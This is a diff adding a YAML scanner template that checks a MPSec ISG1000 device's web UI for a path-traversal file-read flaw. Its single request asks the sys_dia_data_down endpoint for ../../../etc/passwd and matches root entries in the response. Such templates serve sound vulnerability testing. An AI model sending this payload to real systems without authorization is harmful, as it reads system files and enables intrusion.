@@ -1,0 +1,18 @@
+id: mpsec-isg1000-file-read
+
+info:
+    name: mpsec-isg1000-file-read
+    author: YekkoY
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
+        expression: response.status == 200 && response.content_type.contains("text/plain") && response.headers["set-cookie"].contains("USGSESSID=") && "root:[x*]?:0:0:".bmatches(response.body)
+expression: r0()
+
